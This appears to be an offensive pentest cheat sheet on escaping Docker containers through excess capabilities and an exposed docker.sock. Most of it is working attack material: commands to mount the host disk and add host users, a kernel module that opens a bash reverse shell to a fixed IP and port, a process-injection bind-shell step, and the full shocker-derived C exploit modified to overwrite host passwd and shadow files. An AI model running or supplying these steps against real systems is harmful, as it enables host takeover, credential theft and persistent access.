# Container Breakouts

## cap\_sys\_admin Capability

Check if there is cap\_sys\_admin privileges in docker container.&#x20;

```
capsh --print
```

if you see in the result `cap_sys_admin` then you can continue.

* Mount the root directory of host to container and look for the credentials or config files.&#x20;

```
fdisk -l 
mount /dev/sda /mnt
ls -l /mnt/

chroot /mnt/ bash
find / -name password 2>/dev/null
# and check credentials in root file system.
```

* Scan host machine and look for open ports
  * if there is open ssh port

```
chroot /mnt/ adduser turm
# give the password and it will add user to host system. 
# Then login to ssh port with that user. 
```

## docker.sock&#x20;

In the docker-container, if there is a docker.sock have a symlink to /run/docker.sock then there is possibility to do break out.&#x20;

```
find / -name docker.sock 2>/dev/null

#if you see in the result /run/docker.sock go for that way
```

Now we will create a container inside the docker container and connect it to host



```
docker images
# or pull docker images 
docker run -it -v /:/host/ ubuntu:22.04 bash

# That will give us a shell

cd /host/
chroot ./ bash

#after that part add a user and connect with ssh or find
#find credentials. 
```



## cap\_sys\_ptrace capability

if there is cap\_sys\_ptrace capability, then it is possible to inject process and create a bind shell on host it self then it is possible to jump over there via that port.&#x20;

Exploit that can be found

&#x20;[https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128)

{% embed url="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c" %}

After that change that shell code inside the c file and later

```
gcc inject.c -o inject`
```

later inject with PID of serveR

```
./inject 1234
```

then connect host machine with bind shell

`nc IP PORT`



## cap\_sys\_module capability

If there is cap\_sys\_module capability inside the docker container, then that breakout can work . This capability allows the process to load kernel modules and manipulate the kernel, which can be exploited to compromise the underlying host system's security.

```
capsh --print
# if you see cap_sys_module 
```

Then check for the IP address of the docker. First of A.B.C.01 is for the host machine itself.

```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Test");
MODULE_DESCRIPTION("Reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/172.19.0.2/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

Then we should create a Makefile to compile kernel module.&#x20;

````
```makefile
obj-m +=reverse-shell.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
````

Make the kernel module.

`make`

Listen on the port in docker container

Then in new terminal&#x20;

`insmod reverse-shell.ko`



## cap\_dac\_read\_search capability

The `cap_dac_read_search` capability is important because it controls a process's ability to read and search directories/files with discretionary access control (DAC) permissions. DAC permissions determine who can access and modify specific files and directories on a system.

```
capsh --print
```

Later check for cap\_dac\_read\_search capability. ([https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3))

We should use that c code, [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)

Check also is there any `.dockerinit` file exist.&#x20;

Look which disks are mounted. `mount`

* If there is /etc/ directories mounted change in exploit int main() section and add there these directories.&#x20;

after adding these by using gcc compile the code.&#x20;



So by that you can read shadow file of the host machine. Maybe SSH files or ssh config files of host machine can be read also.&#x20;



## cap\_dac\_override&#x20;

if we have both cap\_dac\_read\_search and cap\_dac\_override cap we can create a user in our container and then change host passwd and shadow files with our new created user one.&#x20;

write.c file example can be found here

```
/* shocker: docker PoC VMM-container breakout (C) 2014 Sebastian Krahmer
 *
 * Demonstrates that any given docker image someone is asking
 * you to run in your docker setup can access ANY file on your host,
 * e.g. dumping hosts /etc/shadow or other sensitive info, compromising
 * security of the host and any other docker VM's on it.
 *
 * docker using container based VMM: Sebarate pid and net namespace,
 * stripped caps and RO bind mounts into container's /. However
 * as its only a bind-mount the fs struct from the task is shared
 * with the host which allows to open files by file handles
 * (open_by_handle_at()). As we thankfully have dac_override and
 * dac_read_search we can do this. The handle is usually a 64bit
 * string with 32bit inodenumber inside (tested with ext4).
 * Inode of / is always 2, so we have a starting point to walk
 * the FS path and brute force the remaining 32bit until we find the
 * desired file (It's probably easier, depending on the fhandle export
 * function used for the FS in question: it could be a parent inode# or
 * the inode generation which can be obtained via an ioctl).
 * [In practise the remaining 32bit are all 0 :]
 *
 * tested with docker 0.11 busybox demo image on a 3.11 kernel:
 *
 * docker run -i busybox sh
 *
 * seems to run any program inside VMM with UID 0 (some caps stripped); if
 * user argument is given, the provided docker image still
 * could contain +s binaries, just as demo busybox image does.
 *
 * PS: You should also seccomp kexec() syscall :)
 * PPS: Might affect other container based compartments too
 *
 * $ cc -Wall -std=c99 -O2 shocker.c -static
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>


struct my_file_handle {
        unsigned int handle_bytes;
        int handle_type;
        unsigned char f_handle[8];
};



void die(const char *msg)
{
        perror(msg);
        exit(errno);
}


void dump_handle(const struct my_file_handle *h)
{
        fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
                h->handle_type);
        for (int i = 0; i < h->handle_bytes; ++i) {
                fprintf(stderr,"0x%02x", h->f_handle[i]);
                if ((i + 1) % 20 == 0)
                        fprintf(stderr,"\n");
                if (i < h->handle_bytes - 1)
                        fprintf(stderr,", ");
        }
        fprintf(stderr,"};\n");
}


int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
        int fd;
        uint32_t ino = 0;
        struct my_file_handle outh = {
                .handle_bytes = 8,
                .handle_type = 1
        };
        DIR *dir = NULL;
        struct dirent *de = NULL;

        path = strchr(path, '/');

        // recursion stops if path has been resolved
        if (!path) {
                memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
                oh->handle_type = 1;
                oh->handle_bytes = 8;
                return 1;
        }
        ++path;
        fprintf(stderr, "[*] Resolving '%s'\n", path);

        if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
                die("[-] open_by_handle_at");

        if ((dir = fdopendir(fd)) == NULL)
                die("[-] fdopendir");

        for (;;) {
                de = readdir(dir);
                if (!de)
                        break;
                fprintf(stderr, "[*] Found %s\n", de->d_name);
                if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
                        fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
                        ino = de->d_ino;
                        break;
                }
        }

        fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");


        if (de) {
                for (uint32_t i = 0; i < 0xffffffff; ++i) {
                        outh.handle_bytes = 8;
                        outh.handle_type = 1;
                        memcpy(outh.f_handle, &ino, sizeof(ino));
                        memcpy(outh.f_handle + 4, &i, sizeof(i));

                        if ((i % (1<<20)) == 0)
                                fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
                        if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
                                closedir(dir);
                                close(fd);
                                dump_handle(&outh);
                                return find_handle(bfd, path, &outh, oh);
                        }
                }
        }

        closedir(dir);
        close(fd);
        return 0;
}


int main(int argc, char* argv[])
{
        char buf[0x1000];
        int fd1, fd2;
        struct my_file_handle h;
        struct my_file_handle root_h = {
                .handle_bytes = 8,
                .handle_type = 1,
                .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
        };

        fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014             [***]\n"
               "[***] The tea from the 90's kicks your sekurity again.     [***]\n"
               "[***] If you have pending sec consulting, I'll happily     [***]\n"
               "[***] forward to my friends who drink secury-tea too!      [***]\n\n<enter>\n");

        read(0, buf, 1);

        // get a FS reference from something mounted in from outside
        if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
                die("[-] open");

        if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
                die("[-] Cannot find valid handle!");

        fprintf(stderr, "[!] Got a final handle!\n");
        dump_handle(&h);

        if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
                die("[-] open_by_handle");

        char * line = NULL;
        size_t len = 0;
        FILE *fptr;
        ssize_t read;
        fptr = fopen(argv[2], "r");
        while ((read = getline(&line, &len, fptr)) != -1) {
                write(fd2, line, read);
        }
        printf("Success!!\n");
        close(fd2); close(fd1);

        return 0;
}
```







